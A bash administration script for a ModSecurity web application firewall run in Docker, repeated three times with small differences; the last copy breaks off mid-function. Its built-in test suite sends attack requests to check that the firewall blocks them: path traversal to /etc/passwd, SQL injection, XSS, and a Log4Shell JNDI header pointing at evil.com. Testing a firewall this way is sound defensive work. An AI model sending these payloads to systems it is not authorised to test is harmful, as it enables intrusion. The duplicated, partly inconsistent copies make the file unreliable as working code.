#!/usr/bin/env bash
set -euo pipefail



COMPOSE_FILE="docker-compose.yml"
[ -f "docker-compose.override.yml" ] && COMPOSE_FILE="docker-compose.override.yml"
CONTAINER=$(docker ps --format '{{.Names}}' | grep -i modsecurity | head -1 || true)
if [ -z "$CONTAINER" ]; then
    echo "Error: no running ModSecurity container found." >&2
    exit 1
fi
# Load config from .env
IPINFO_TOKEN=""
WAF_DOMAIN=""
if [ -f "$HOME/.aux/.env" ]; then
    IPINFO_TOKEN=$(grep -E '^IPINFO_TOKEN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
    WAF_DOMAIN=$(grep -E '^WAF_DOMAIN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
fi
DOMAIN="${WAF_DOMAIN:-https://localhost}"

declare -A _ip_cache
ip_lookup() {
    local ip="$1"
    if [ -z "$IPINFO_TOKEN" ]; then echo ""; return; fi
    if [[ -v _ip_cache["$ip"] ]]; then echo "${_ip_cache[$ip]}"; return; fi
    local json
    json=$(curl -s --max-time 2 "https://ipinfo.io/$ip/json?token=$IPINFO_TOKEN" 2>/dev/null || true)
    local info=""
    if [ -n "$json" ]; then
        info=$(echo "$json" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    parts = [p for p in [d.get('city',''), d.get('country','')] if p]
    org = d.get('org','')
    if org: parts.append(org)
    print(', '.join(parts))
except: pass
" 2>/dev/null || true)
    fi
    _ip_cache["$ip"]="$info"
    echo "$info"
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

usage() {
    cat <<'HELP'
WAF Admin — ModSecurity CRS management

Usage: ./waf.sh <command> [args]

  MONITORING
    status              Container & engine status, rules loaded
    logs [N]            Last N blocked requests (default: 20)
    tail                Live tail of audit log
    stats               Top blocked IPs, top triggered rules

  CONTROL
    on                  Enable WAF (blocking mode)
    off                 Disable WAF (pass-through)
    detect              Detection-only mode (log but don't block)
    paranoia <1-4>      Set CRS paranoia level
    reload              Recreate ModSecurity container

  WHITELIST
    allow-ip <IP>       Whitelist an IP address
    deny-ip <IP>        Remove IP from whitelist
    disable-rule <ID>   Disable a CRS rule by ID
    enable-rule <ID>    Re-enable a disabled rule
    list-exclusions     Show all custom exclusions

  TESTING
    test                Run common attack patterns against WAF
    test-url <URL>      Test a specific URL path

HELP
}

# ── helpers ──────────────────────────────────────────────────────────

_exec() {
    docker exec "$CONTAINER" "$@"
}

_reload() {
    echo -e "${YELLOW}Reloading ModSecurity rules...${NC}"
    docker exec "$CONTAINER" nginx -s reload 2>/dev/null
    echo -e "${GREEN}Done.${NC}"
}

_restart() {
    echo -e "${YELLOW}Recreating ModSecurity container...${NC}"
    $COMPOSE up -d --force-recreate --no-deps modsecurity
    echo -e "${GREEN}Done.${NC}"
}

EXCLUSIONS_FILE="modsecurity/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf"

# ── status ───────────────────────────────────────────────────────────

cmd_status() {
    echo -e "${CYAN}=== Container ===${NC}"
    docker ps --filter "name=$CONTAINER" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
    echo ""
    echo -e "${CYAN}=== Engine ===${NC}"
    grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1
    echo ""
    echo -e "${CYAN}=== Rules loaded ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -oP 'rules loaded inline/local/remote: \K.*' | tail -1
    echo ""
    echo -e "${CYAN}=== CRS version ===${NC}"
    _exec sh -c 'cat /opt/owasp-crs/VERSION 2>/dev/null || echo "unknown"'
    echo ""
    echo -e "${CYAN}=== Paranoia / Blocking ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -E 'PARANOIA|BLOCKING_PARANOIA'
}

# ── helpers: JSON log extraction ──────────────────────────────────────

_get_events() {
    docker logs "$CONTAINER" 2>&1 | grep '^{"transaction"' || true
}

# ── logs ─────────────────────────────────────────────────────────────

cmd_logs() {
    local count="${1:-20}"
    echo -e "${CYAN}=== Last $count WAF events ===${NC}"
    echo ""

    local events
    events=$(_get_events)
    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    echo "$events" | tail -n "$count" | jq -r '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        "\u001b[33m" + $t.time_stamp + "\u001b[0m" +
        "  \u001b[36m" + ($t.request.method // "?") + " " + ($t.request.uri // "?") + "\u001b[0m" +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "\n  rules: " + $rules
    ' 2>/dev/null || echo "Error parsing logs."
}

cmd_tail() {
    echo -e "${CYAN}=== Live WAF log (Ctrl+C to stop) ===${NC}"
    docker logs -f "$CONTAINER" 2>&1 | grep --line-buffered '^{"transaction"' | jq -r --unbuffered '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        $t.time_stamp + "  " + ($t.request.method // "?") + " " + ($t.request.uri // "?") +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "  rules: " + $rules
    '
}

# ── stats ────────────────────────────────────────────────────────────

cmd_stats() {
    local events
    events=$(_get_events)

    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    local total
    total=$(echo "$events" | wc -l)
    echo -e "${CYAN}=== Total events: ${total} ===${NC}"
    echo ""

    echo -e "${CYAN}=== Top 10 source IPs ===${NC}"
    local ip_stats
    ip_stats=$(echo "$events" | jq -r '.transaction | (.request.headers["X-Real-Ip"] // .client_ip)' | sort | uniq -c | sort -rn | head -10)
    while read -r count ip; do
        local geo
        geo=$(ip_lookup "$ip")
        if [ -n "$geo" ]; then
            printf "  %6s  %-18s  ${CYAN}%s${NC}\n" "$count" "$ip" "$geo"
        else
            printf "  %6s  %s\n" "$count" "$ip"
        fi
    done <<< "$ip_stats"
    echo ""

    echo -e "${CYAN}=== Top 10 triggered rules ===${NC}"
    echo "$events" | jq -r '.transaction.messages[]? | (.details.ruleId) + " " + .message' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== Top 10 URIs ===${NC}"
    echo "$events" | jq -r '.transaction.request.uri' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== False positive candidates (legit 2xx responses flagged) ===${NC}"
    echo "$events" | jq -r '
        select(.transaction.response.http_code == 200) |
        .transaction as $t |
        ($t.messages[]? | .details.ruleId + " " + .message)
    ' | sort | uniq -c | sort -rn | head -10
}

# ── engine control ───────────────────────────────────────────────────

_set_engine() {
    local mode="$1"
    # Persist in $COMPOSE_FILE for future restarts
    sed -i "s/MODSEC_RULE_ENGINE=.*/MODSEC_RULE_ENGINE=$mode/" $COMPOSE_FILE
    # Apply immediately via override + reload (no downtime)
    docker exec "$CONTAINER" sh -c "echo 'SecRuleEngine $mode' > /etc/modsecurity.d/modsecurity-override.conf"
    _reload
    echo -e "${GREEN}SecRuleEngine set to: ${mode}${NC}"
}

cmd_on() {
    _set_engine "On"
}

cmd_off() {
    echo -e "${RED}WARNING: WAF will be completely disabled!${NC}"
    read -rp "Continue? [y/N] " confirm
    [[ "$confirm" =~ ^[yY]$ ]] || { echo "Aborted."; return; }
    _set_engine "Off"
}

cmd_detect() {
    _set_engine "DetectionOnly"
    echo -e "${YELLOW}WAF is now in detection-only mode (logging but not blocking).${NC}"
}

cmd_paranoia() {
    local level="${1:-}"
    if [[ ! "$level" =~ ^[1-4]$ ]]; then
        echo "Usage: ./waf.sh paranoia <1-4>"
        return 1
    fi
    echo -e "${YELLOW}Setting paranoia level to $level (requires restart)...${NC}"
    # Update env and recreate
    local current
    current=$(grep '^      - PARANOIA=' $COMPOSE_FILE | head -1 | cut -d= -f2)
    if [ -n "$current" ]; then
        sed -i "s/PARANOIA=${current}/PARANOIA=${level}/" $COMPOSE_FILE
    fi
    _restart
}

cmd_reload() {
    _restart
}

# ── whitelist ────────────────────────────────────────────────────────

cmd_allow_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh allow-ip <IP>"
        return 1
    fi
    # Use next available id in 10xxx range
    local next_id
    next_id=$(grep -oP 'id:1\K[0-9]+' "$EXCLUSIONS_FILE" 2>/dev/null | sort -n | tail -1)
    next_id=$((${next_id:-9} + 1))
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Whitelist IP $ip" >> "$EXCLUSIONS_FILE"
    echo "SecRule REMOTE_ADDR \"@ipMatch $ip\" \"id:1${next_id},phase:1,allow,nolog,ctl:ruleEngine=Off\"" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip whitelisted (WAF bypassed).${NC}"
}

cmd_deny_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh deny-ip <IP>"
        return 1
    fi
    # Remove the whitelist line and its comment
    sed -i "/@ipMatch $ip/d" "$EXCLUSIONS_FILE"
    sed -i "/# Whitelist IP $ip/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip removed from whitelist.${NC}"
}

cmd_disable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh disable-rule <ID>"
        return 1
    fi
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Disabled rule $rule_id" >> "$EXCLUSIONS_FILE"
    echo "SecRuleRemoveById $rule_id" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id disabled.${NC}"
}

cmd_enable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh enable-rule <ID>"
        return 1
    fi
    sed -i "/SecRuleRemoveById $rule_id/d" "$EXCLUSIONS_FILE"
    sed -i "/# Disabled rule $rule_id/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id re-enabled.${NC}"
}

cmd_list_exclusions() {
    echo -e "${CYAN}=== Exclusions file: $EXCLUSIONS_FILE ===${NC}"
    cat "$EXCLUSIONS_FILE"
}

# ── testing ──────────────────────────────────────────────────────────

cmd_test() {
    local engine
    engine=$(grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1)
    if [[ "$engine" != "On" ]]; then
        echo -e "${YELLOW}WAF is in '${engine}' mode — blocks won't work. Switch to On first: ./waf.sh on${NC}"
        echo ""
    fi

    echo -e "${CYAN}=== WAF Test Suite ===${NC}"
    echo ""

    local passed=0
    local failed=0

    _run_test() {
        local name="$1"
        local expect="$2"
        shift 2
        local code
        code=$("$@" 2>/dev/null || echo "000")

        if [[ "$expect" == "block" ]]; then
            if [[ "$code" == "403" ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code (blocked)"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 403)"
                failed=$((failed + 1))
            fi
        else
            if [[ "$code" =~ ^(2|401) ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 2xx)"
                failed=$((failed + 1))
            fi
        fi
    }

    _run_test "Scanner detection" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: nikto" "${DOMAIN}/v1/models"

    _run_test "Path traversal" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/../../etc/passwd"

    _run_test "SQL injection" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?id=1%20UNION%20SELECT%20*%20FROM%20users"

    _run_test "XSS" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?q=%3Cscript%3Ealert(1)%3C/script%3E"

    _run_test "Log4Shell" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "X-Api-Key: \${jndi:ldap://evil.com/a}" "${DOMAIN}/v1/models"

    _run_test "Normal request" pass \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models"

    echo ""
    echo -e "Results: ${GREEN}${passed} passed${NC}, ${RED}${failed} failed${NC}"
}

cmd_test_url() {
    local url="${1:-}"
    if [ -z "$url" ]; then
        echo "Usage: ./waf.sh test-url <path>"
        return 1
    fi
    local full="${DOMAIN}${url}"
    echo -e "${CYAN}Testing: ${full}${NC}"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$full")
    local headers
    headers=$(curl -sk -D - -o /dev/null "$full")
    echo "HTTP status: $code"
    echo "$headers"
}

# ── main ─────────────────────────────────────────────────────────────

case "${1:-}" in
    status)         cmd_status ;;
    logs)           cmd_logs "${2:-}" ;;
    tail)           cmd_tail ;;
    stats)          cmd_stats ;;
    on)             cmd_on ;;
    off)            cmd_off ;;
    detect)         cmd_detect ;;
    paranoia)       cmd_paranoia "${2:-}" ;;
    reload)         cmd_reload ;;
    allow-ip)       cmd_allow_ip "${2:-}" ;;
    deny-ip)        cmd_deny_ip "${2:-}" ;;
    disable-rule)   cmd_disable_rule "${2:-}" ;;
    enable-rule)    cmd_enable_rule "${2:-}" ;;
    list-exclusions) cmd_list_exclusions ;;
    test)           cmd_test ;;
    test-url)       cmd_test_url "${2:-}" ;;
    *)              usage ;;
esac
#!/usr/bin/env bash
set -euo pipefail

COMPOSE="docker compose"
COMPOSE_FILE="docker-compose.yml"
[ -f "docker-compose.override.yml" ] && COMPOSE_FILE="docker-compose.override.yml"
CONTAINER=$(docker ps --format '{{.Names}}' | grep -i modsecurity | head -1 || true)
if [ -z "$CONTAINER" ]; then
    echo "Error: no running ModSecurity container found." >&2
    exit 1
fi
# Load config from .env
IPINFO_TOKEN=""
WAF_DOMAIN=""
if [ -f "$HOME/.aux/.env" ]; then
    IPINFO_TOKEN=$(grep -E '^IPINFO_TOKEN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
    WAF_DOMAIN=$(grep -E '^WAF_DOMAIN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
fi
DOMAIN="${WAF_DOMAIN:-https://localhost}"

declare -A _ip_cache
ip_lookup() {
    local ip="$1"
    if [ -z "$IPINFO_TOKEN" ]; then echo ""; return; fi
    if [[ -v _ip_cache["$ip"] ]]; then echo "${_ip_cache[$ip]}"; return; fi
    local json
    json=$(curl -s --max-time 2 "https://ipinfo.io/$ip/json?token=$IPINFO_TOKEN" 2>/dev/null || true)
    local info=""
    if [ -n "$json" ]; then
        info=$(echo "$json" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    parts = [p for p in [d.get('city',''), d.get('country','')] if p]
    org = d.get('org','')
    if org: parts.append(org)
    print(', '.join(parts))
except: pass
" 2>/dev/null || true)
    fi
    _ip_cache["$ip"]="$info"
    echo "$info"
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

usage() {
    cat <<'HELP'
WAF Admin — ModSecurity CRS management

Usage: ./waf.sh <command> [args]

  MONITORING
    status              Container & engine status, rules loaded
    logs [N]            Last N blocked requests (default: 20)
    tail                Live tail of audit log
    stats               Top blocked IPs, top triggered rules

  CONTROL
    on                  Enable WAF (blocking mode)
    off                 Disable WAF (pass-through)
    detect              Detection-only mode (log but don't block)
    paranoia <1-4>      Set CRS paranoia level
    reload              Recreate ModSecurity container

  WHITELIST
    allow-ip <IP>       Whitelist an IP address
    deny-ip <IP>        Remove IP from whitelist
    disable-rule <ID>   Disable a CRS rule by ID
    enable-rule <ID>    Re-enable a disabled rule
    list-exclusions     Show all custom exclusions

  TESTING
    test                Run common attack patterns against WAF
    test-url <URL>      Test a specific URL path

HELP
}

# ── helpers ──────────────────────────────────────────────────────────

_exec() {
    docker exec "$CONTAINER" "$@"
}

_reload() {
    echo -e "${YELLOW}Reloading ModSecurity rules...${NC}"
    docker exec "$CONTAINER" nginx -s reload 2>/dev/null
    echo -e "${GREEN}Done.${NC}"
}

_restart() {
    echo -e "${YELLOW}Recreating ModSecurity container...${NC}"
    $COMPOSE up -d --force-recreate --no-deps modsecurity
    echo -e "${GREEN}Done.${NC}"
}

EXCLUSIONS_FILE="modsecurity/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf"

# ── status ───────────────────────────────────────────────────────────

cmd_status() {
    echo -e "${CYAN}=== Container ===${NC}"
    docker ps --filter "name=$CONTAINER" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
    echo ""
    echo -e "${CYAN}=== Engine ===${NC}"
    grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1
    echo ""
    echo -e "${CYAN}=== Rules loaded ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -oP 'rules loaded inline/local/remote: \K.*' | tail -1
    echo ""
    echo -e "${CYAN}=== CRS version ===${NC}"
    _exec sh -c 'cat /opt/owasp-crs/VERSION 2>/dev/null || echo "unknown"'
    echo ""
    echo -e "${CYAN}=== Paranoia / Blocking ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -E 'PARANOIA|BLOCKING_PARANOIA'
}

# ── helpers: JSON log extraction ──────────────────────────────────────

_get_events() {
    docker logs "$CONTAINER" 2>&1 | grep '^{"transaction"' || true
}

# Pipe-safe jq wrapper: skips lines that jq cannot parse
_jq_safe() {
    local filter="$1"
    while IFS= read -r line; do
        echo "$line" | jq -r "$filter" 2>/dev/null || true
    done
}

# ── logs ─────────────────────────────────────────────────────────────

cmd_logs() {
    local count="${1:-20}"
    echo -e "${CYAN}=== Last $count WAF events ===${NC}"
    echo ""

    local events
    events=$(_get_events)
    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    echo "$events" | tail -n "$count" | _jq_safe '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        "\u001b[33m" + $t.time_stamp + "\u001b[0m" +
        "  \u001b[36m" + ($t.request.method // "?") + " " + ($t.request.uri // "?") + "\u001b[0m" +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "\n  rules: " + $rules
    '
}

cmd_tail() {
    echo -e "${CYAN}=== Live WAF log (Ctrl+C to stop) ===${NC}"
    docker logs -f "$CONTAINER" 2>&1 | grep --line-buffered '^{"transaction"' | jq -r --unbuffered '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        $t.time_stamp + "  " + ($t.request.method // "?") + " " + ($t.request.uri // "?") +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "  rules: " + $rules
    '
}

# ── stats ────────────────────────────────────────────────────────────

cmd_stats() {
    local events
    events=$(_get_events)

    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    local total
    total=$(echo "$events" | wc -l)
    echo -e "${CYAN}=== Total events: ${total} ===${NC}"
    echo ""

    echo -e "${CYAN}=== Top 10 source IPs ===${NC}"
    local ip_stats
    ip_stats=$(echo "$events" | _jq_safe '.transaction | (.request.headers["X-Real-Ip"] // .client_ip)' | sort | uniq -c | sort -rn | head -10)
    while read -r count ip; do
        local geo
        geo=$(ip_lookup "$ip")
        if [ -n "$geo" ]; then
            printf "  %6s  %-18s  ${CYAN}%s${NC}\n" "$count" "$ip" "$geo"
        else
            printf "  %6s  %s\n" "$count" "$ip"
        fi
    done <<< "$ip_stats"
    echo ""

    echo -e "${CYAN}=== Top 10 triggered rules ===${NC}"
    echo "$events" | _jq_safe '.transaction.messages[]? | (.details.ruleId) + " " + .message' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== Top 10 URIs ===${NC}"
    echo "$events" | _jq_safe '.transaction.request.uri' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== False positive candidates (legit 2xx responses flagged) ===${NC}"
    echo "$events" | _jq_safe '
        select(.transaction.response.http_code == 200) |
        .transaction as $t |
        ($t.messages[]? | .details.ruleId + " " + .message)
    ' | sort | uniq -c | sort -rn | head -10
}

# ── engine control ───────────────────────────────────────────────────

_set_engine() {
    local mode="$1"
    # Persist in $COMPOSE_FILE for future restarts
    sed -i "s/MODSEC_RULE_ENGINE=.*/MODSEC_RULE_ENGINE=$mode/" $COMPOSE_FILE
    # Apply immediately via override + reload (no downtime)
    docker exec "$CONTAINER" sh -c "echo 'SecRuleEngine $mode' > /etc/modsecurity.d/modsecurity-override.conf"
    _reload
    echo -e "${GREEN}SecRuleEngine set to: ${mode}${NC}"
}

cmd_on() {
    _set_engine "On"
}

cmd_off() {
    echo -e "${RED}WARNING: WAF will be completely disabled!${NC}"
    read -rp "Continue? [y/N] " confirm
    [[ "$confirm" =~ ^[yY]$ ]] || { echo "Aborted."; return; }
    _set_engine "Off"
}

cmd_detect() {
    _set_engine "DetectionOnly"
    echo -e "${YELLOW}WAF is now in detection-only mode (logging but not blocking).${NC}"
}

cmd_paranoia() {
    local level="${1:-}"
    if [[ ! "$level" =~ ^[1-4]$ ]]; then
        echo "Usage: ./waf.sh paranoia <1-4>"
        return 1
    fi
    echo -e "${YELLOW}Setting paranoia level to $level (requires restart)...${NC}"
    # Update env and recreate
    local current
    current=$(grep '^      - PARANOIA=' $COMPOSE_FILE | head -1 | cut -d= -f2)
    if [ -n "$current" ]; then
        sed -i "s/PARANOIA=${current}/PARANOIA=${level}/" $COMPOSE_FILE
    fi
    _restart
}

cmd_reload() {
    _restart
}

# ── whitelist ────────────────────────────────────────────────────────

cmd_allow_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh allow-ip <IP>"
        return 1
    fi
    # Use next available id in 10xxx range
    local next_id
    next_id=$(grep -oP 'id:1\K[0-9]+' "$EXCLUSIONS_FILE" 2>/dev/null | sort -n | tail -1)
    next_id=$((${next_id:-9} + 1))
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Whitelist IP $ip" >> "$EXCLUSIONS_FILE"
    echo "SecRule REMOTE_ADDR \"@ipMatch $ip\" \"id:1${next_id},phase:1,allow,nolog,ctl:ruleEngine=Off\"" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip whitelisted (WAF bypassed).${NC}"
}

cmd_deny_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh deny-ip <IP>"
        return 1
    fi
    # Remove the whitelist line and its comment
    sed -i "/@ipMatch $ip/d" "$EXCLUSIONS_FILE"
    sed -i "/# Whitelist IP $ip/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip removed from whitelist.${NC}"
}

cmd_disable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh disable-rule <ID>"
        return 1
    fi
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Disabled rule $rule_id" >> "$EXCLUSIONS_FILE"
    echo "SecRuleRemoveById $rule_id" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id disabled.${NC}"
}

cmd_enable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh enable-rule <ID>"
        return 1
    fi
    sed -i "/SecRuleRemoveById $rule_id/d" "$EXCLUSIONS_FILE"
    sed -i "/# Disabled rule $rule_id/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id re-enabled.${NC}"
}

cmd_list_exclusions() {
    echo -e "${CYAN}=== Exclusions file: $EXCLUSIONS_FILE ===${NC}"
    cat "$EXCLUSIONS_FILE"
}

# ── testing ──────────────────────────────────────────────────────────

cmd_test() {
    local engine
    engine=$(grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1)
    if [[ "$engine" != "On" ]]; then
        echo -e "${YELLOW}WAF is in '${engine}' mode — blocks won't work. Switch to On first: ./waf.sh on${NC}"
        echo ""
    fi

    echo -e "${CYAN}=== WAF Test Suite ===${NC}"
    echo ""

    local passed=0
    local failed=0

    _run_test() {
        local name="$1"
        local expect="$2"
        shift 2
        local code
        code=$("$@" 2>/dev/null || echo "000")

        if [[ "$expect" == "block" ]]; then
            if [[ "$code" == "403" ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code (blocked)"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 403)"
                failed=$((failed + 1))
            fi
        else
            if [[ "$code" =~ ^(2|401) ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 2xx)"
                failed=$((failed + 1))
            fi
        fi
    }

    _run_test "Scanner detection" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: nikto" "${DOMAIN}/v1/models"

    _run_test "Path traversal" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/../../etc/passwd"

    _run_test "SQL injection" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?id=1%20UNION%20SELECT%20*%20FROM%20users"

    _run_test "XSS" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?q=%3Cscript%3Ealert(1)%3C/script%3E"

    _run_test "Log4Shell" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "X-Api-Key: \${jndi:ldap://evil.com/a}" "${DOMAIN}/v1/models"

    _run_test "Normal request" pass \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models"

    echo ""
    echo -e "Results: ${GREEN}${passed} passed${NC}, ${RED}${failed} failed${NC}"
}

cmd_test_url() {
    local url="${1:-}"
    if [ -z "$url" ]; then
        echo "Usage: ./waf.sh test-url <path>"
        return 1
    fi
    local full="${DOMAIN}${url}"
    echo -e "${CYAN}Testing: ${full}${NC}"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$full")
    local headers
    headers=$(curl -sk -D - -o /dev/null "$full")
    echo "HTTP status: $code"
    echo "$headers"
}

# ── main ─────────────────────────────────────────────────────────────

case "${1:-}" in
    status)         cmd_status ;;
    logs)           cmd_logs "${2:-}" ;;
    tail)           cmd_tail ;;
    stats)          cmd_stats ;;
    on)             cmd_on ;;
    off)            cmd_off ;;
    detect)         cmd_detect ;;
    paranoia)       cmd_paranoia "${2:-}" ;;
    reload)         cmd_reload ;;
    allow-ip)       cmd_allow_ip "${2:-}" ;;
    deny-ip)        cmd_deny_ip "${2:-}" ;;
    disable-rule)   cmd_disable_rule "${2:-}" ;;
    enable-rule)    cmd_enable_rule "${2:-}" ;;
    list-exclusions) cmd_list_exclusions ;;
    test)           cmd_test ;;
    test-url)       cmd_test_url "${2:-}" ;;
    *)              usage ;;
esac
#!/usr/bin/env bash
set -euo pipefail

COMPOSE="docker compose"
COMPOSE_FILE="docker-compose.yml"
[ -f "docker-compose.override.yml" ] && COMPOSE_FILE="docker-compose.override.yml"
CONTAINER=$(docker ps --format '{{.Names}}' | grep -i modsecurity | head -1 || true)
if [ -z "$CONTAINER" ]; then
    echo "Error: no running ModSecurity container found." >&2
    exit 1
fi
# Load config from .env
IPINFO_TOKEN=""
WAF_DOMAIN=""
if [ -f "$HOME/.aux/.env" ]; then
    IPINFO_TOKEN=$(grep -E '^IPINFO_TOKEN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
    WAF_DOMAIN=$(grep -E '^WAF_DOMAIN=' "$HOME/.aux/.env" | cut -d'=' -f2 | tr -d '"' || true)
fi
DOMAIN="${WAF_DOMAIN:-https://localhost}"

declare -A _ip_cache
ip_lookup() {
    local ip="$1"
    if [ -z "$IPINFO_TOKEN" ]; then echo ""; return; fi
    if [[ -v _ip_cache["$ip"] ]]; then echo "${_ip_cache[$ip]}"; return; fi
    local json
    json=$(curl -s --max-time 2 "https://ipinfo.io/$ip/json?token=$IPINFO_TOKEN" 2>/dev/null || true)
    local info=""
    if [ -n "$json" ]; then
        info=$(echo "$json" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    parts = [p for p in [d.get('city',''), d.get('country','')] if p]
    org = d.get('org','')
    if org: parts.append(org)
    print(', '.join(parts))
except: pass
" 2>/dev/null || true)
    fi
    _ip_cache["$ip"]="$info"
    echo "$info"
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

usage() {
    cat <<'HELP'
WAF Admin — ModSecurity CRS management

Usage: ./waf.sh <command> [args]

  MONITORING
    status              Container & engine status, rules loaded
    logs [N]            Last N blocked requests (default: 20)
    tail                Live tail of audit log
    stats               Top blocked IPs, top triggered rules

  CONTROL
    on                  Enable WAF (blocking mode)
    off                 Disable WAF (pass-through)
    detect              Detection-only mode (log but don't block)
    paranoia <1-4>      Set CRS paranoia level
    reload              Recreate ModSecurity container

  WHITELIST
    allow-ip <IP>       Whitelist an IP address
    deny-ip <IP>        Remove IP from whitelist
    disable-rule <ID>   Disable a CRS rule by ID
    enable-rule <ID>    Re-enable a disabled rule
    list-exclusions     Show all custom exclusions

  TESTING
    test                Run common attack patterns against WAF
    test-url <URL>      Test a specific URL path

HELP
}

# ── helpers ──────────────────────────────────────────────────────────

_exec() {
    docker exec "$CONTAINER" "$@"
}

_reload() {
    echo -e "${YELLOW}Reloading ModSecurity rules...${NC}"
    docker exec "$CONTAINER" nginx -s reload 2>/dev/null
